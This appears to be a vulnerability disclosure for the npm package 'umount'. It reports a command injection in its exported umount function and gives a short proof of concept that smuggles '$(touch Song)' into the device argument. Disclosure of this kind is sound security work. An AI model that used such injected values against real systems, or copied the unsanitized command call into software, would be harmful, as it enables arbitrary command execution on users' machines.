# Overview

umount is a device in UNIX, do nothing in Windows, this package are vulnerable to Command Injection.

The argument device can be controlled by users without any sanitization.

# Proof of Concept

```
var root = require("umount");
var device = '\" \$(touch Song) \"';
root.umount(device, function(){});
```

The injection point is located in line `52` of index file `build/umount.js` in the exported function `umount(device, callback)`.
